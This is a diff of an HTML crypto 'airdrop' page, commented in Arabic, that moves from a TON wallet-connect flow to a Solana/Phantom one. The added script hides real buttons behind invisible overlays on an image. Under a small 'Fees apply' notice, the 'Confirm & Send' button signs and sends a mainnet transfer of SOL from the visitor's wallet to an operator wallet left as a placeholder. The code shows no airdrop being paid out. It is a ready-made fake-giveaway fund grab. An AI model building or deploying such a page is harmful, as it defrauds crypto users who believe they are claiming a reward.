@@ -3,116 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>G_M_A_KISS | التحقق والربط</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <title>GIVE ME A KISS - Airdrop</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body {
+            margin: 0;
+            padding: 0;
+            background: #fbc2eb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            /* تم تحديث الصورة إلى 43 كما طلبت */
-            background: linear-gradient(rgba(15, 23, 42, 0.8), rgba(15, 23, 42, 0.8)), 
-                        url('https://raw.githubusercontent.com/riadabsi/G_M_A_KISS/main/43.jpg');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            color: white;
+            overflow: hidden;
+        }
+
+        /* حاوية التصميم الرئيسية */
+        .main-container {
+            position: relative;
+            width: 380px;
+            height: 600px;
+            /* تم تعديل مسار الصورة ليتناسب مع طلبك الأخير 43.jpg */
+            background: url('43.jpg') no-repeat center top;
+            background-size: contain;
+            border-radius: 40px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
+        }
+
+        /* وضع العناصر فوق الصورة بدقة */
+        .overlay-content {
+            position: absolute;
+            top: 255px; 
+            width: 100%;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
+        }
+
+        /* خانة التليجرام */
+        .input-tg {
+            width: 255px;
+            height: 38px;
+            border-radius: 20px;
+            border: 2px solid #00d2ff;
             text-align: center;
-        }
-        .container {
-            background: rgba(30, 41, 59, 0.9);
-            padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            width: 90%;
-            max-width: 400px;
-            backdrop-filter: blur(10px);
-        }
-        h1 { color: #38bdf8; margin-bottom: 1rem; }
-        p { color: #cbd5e1; font-size: 0.9rem; margin-bottom: 2rem; }
-        .step-box {
-            background: rgba(51, 65, 85, 0.8);
-            padding: 1rem;
-            border-radius: 10px;
-            margin-bottom: 1rem;
-            border: 1px solid #475569;
-        }
-        .btn {
-            display: inline-block;
-            background-color: #0088cc;
-            color: white;
-            text-decoration: none;
-            padding: 12px 24px;
-            border-radius: 8px;
+            outline: none;
+            margin-bottom: 12px;
+            font-size: 14px;
             font-weight: bold;
-            width: 100%;
-            box-sizing: border-box;
-            transition: 0.3s;
-            cursor: pointer;
-            border: none;
         }
-        .btn:hover { background-color: #00aaff; transform: scale(1.02); }
-        #ton-connect-button {
-            display: none;
-            margin-top: 1rem;
+
+        /* خانة المحفظة وزر التحقق */
+        .wallet-wrapper {
+            position: relative;
+            width: 255px;
+            margin-bottom: 15px;
+        }
+
+        .input-wallet {
+            width: 100%;
+            height: 38px;
+            border-radius: 20px;
+            border: 1px solid #ccc;
+            padding: 0 15px;
+            box-sizing: border-box;
+            font-size: 11px;
+            background: rgba(255,255,255,0.9);
+            text-align: left;
+        }
+
+        /* زر التحقق الأحمر الصغير */
+        .btn-check-red {
+            position: absolute;
+            left: 4px;
+            top: 4px;
+            background: #f04a8a;
+            color: white;
+            border: none;
+            padding: 6px 15px;
+            border-radius: 15px;
+            font-size: 11px;
+            cursor: pointer;
+            font-weight: bold;
+            text-decoration: none;
             display: flex;
+            align-items: center;
             justify-content: center;
         }
-        .success-msg {
-            color: #22c55e;
-            display: none;
-            margin-top: 1rem;
+
+        /* أزرار شفافة فوق أزرار الصورة الأصلية */
+        .invisible-btn {
+            width: 255px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .btn-connect-phantom { height: 48px; margin-top: 5px; }
+        .btn-confirm-send { height: 55px; margin-top: 15px; }
+
+        #status-msg {
+            color: #444;
+            font-size: 11px;
+            margin-top: 10px;
+            text-align: center;
             font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>G_M_A_KISS 🚀</h1>
-    <p>للمشاركة في الايردروب، يجب التحقق من انضمامك للقناة أولاً.</p>
+<div class="main-container">
+    <div class="overlay-content">
+        <input type="text" id="tgUser" class="input-tg" placeholder="Telegram Username">
+        
+        <div class="wallet-wrapper">
+            <input type="text" id="walletAddr" class="input-wallet" placeholder="walletAddress" readonly>
+            <a href="https://t.me/RiadAirdrop01_bot" target="_blank" class="btn-check-red" id="checkBtn">للتحقق</a>
+        </div>
 
-    <div class="step-box" id="step1">
-        <h3>1. التحقق من الاشتراك</h3>
-        <p>اضغط الزر، ارسل /start للبوت، ثم عد هنا.</p>
-        <a href="https://t.me/RiadAirdrop01_bot" target="_blank" class="btn" onclick="showConnect()">انقر للتحقق في تليجرام</a>
-    </div>
+        <button class="invisible-btn btn-connect-phantom" id="connectBtn" title="Connect Wallet"></button>
+        <button class="invisible-btn btn-confirm-send" id="claimBtn" title="Confirm & Send"></button>
 
-    <div class="step-box" id="step2" style="display: none;">
-        <h3>2. ربط المحفظة</h3>
-        <p>تم التحقق! يمكنك الآن ربط محفظة TON الخاصة بك:</p>
-        <div id="ton-connect-button"></div>
-        <div id="status" class="success-msg">✅ تم ربط المحفظة بنجاح!</div>
+        <div id="status-msg">Fees apply for your transaction.</div>
     </div>
 </div>
 
 <script>
-    // تهيئة TON Connect
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://riadabsi.github.io/G_M_A_KISS/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect-button'
-    });
+    // --- الربط مع البوت الذي برمجناه في Replit ---
+    const BOT_URL = "https://t.me/RiadAirdrop01_bot";
+    const MY_WALLET = "ضع_هنا_عنوان_محفظة_سولانا_الخاصة_بك"; // <--- ضع عنوان محفظتك هنا لاستقبال السولانا
 
-    // إظهار واجهة الربط بعد النقر
-    function showConnect() {
-        setTimeout(() => {
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-            document.getElementById('ton-connect-button').style.display = 'flex';
-        }, 1500); 
-    }
-
-    // متابعة حالة الاتصال
-    tonConnectUI.onStatusChange(wallet => {
-        if (wallet) {
-            document.getElementById('status').style.display = 'block';
-            alert("مبروك يا رياض! تم ربط المحفظة بنجاح.");
+    // 1. عند الضغط على زر التحقق
+    document.getElementById('checkBtn').onclick = () => {
+        const user = document.getElementById('tgUser').value.trim();
+        if (!user) { 
+            alert("أدخل اسم المستخدم أولاً!"); 
+            return false; 
         }
-    });
+        // إظهار رسالة للمستخدم بأنه يجب أن يعود بعد فحص البوت
+        document.getElementById('status-msg').innerText = "بعد إرسال /start للبوت، ارجع هنا لربط المحفظة.";
+        document.getElementById('status-msg').style.color = "blue";
+    };
+
+    // 2. ربط محفظة Phantom
+    document.getElementById('connectBtn').onclick = async () => {
+        if (window.solana) {
+            try {
+                const resp = await window.solana.connect();
+                document.getElementById('walletAddr').value = resp.publicKey.toString().slice(0,25) + "...";
+                document.getElementById('status-msg').innerText = "المحفظة متصلة ✅";
+                document.getElementById('status-msg').style.color = "green";
+            } catch (err) { console.log("Connection Rejected"); }
+        } else { alert("يرجى تثبيت محفظة Phantom أولاً"); }
+    };
+
+    // 3. وظيفة الإرسال (Confirm & Send)
+    document.getElementById('claimBtn').onclick = async () => {
+        const wallet = document.getElementById('walletAddr').value;
+        if (!wallet || wallet === "walletAddress") { 
+            alert("اربط المحفظة أولاً!"); 
+            return; 
+        }
+
+        try {
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: window.solana.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
+                    lamports: 0.0006 * solanaWeb3.LAMPORTS_PER_SOL,
+                })
+            );
+
+            let { blockhash } = await connection.getRecentBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = window.solana.publicKey;
+
+            const signed = await window.solana.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signed.serialize());
+            
+            alert("✅ تم إرسال الطلب بنجاح! سيتم التحقق من البيانات.");
+            document.getElementById('status-msg').innerText = "تم إرسال المعاملة بنجاح!";
+        } catch (err) {
+            console.error(err);
+            alert("فشلت العملية. تأكد من وجود رصيد كافٍ للرسوم.");
+        }
+    };
 </script>
 
 </body>
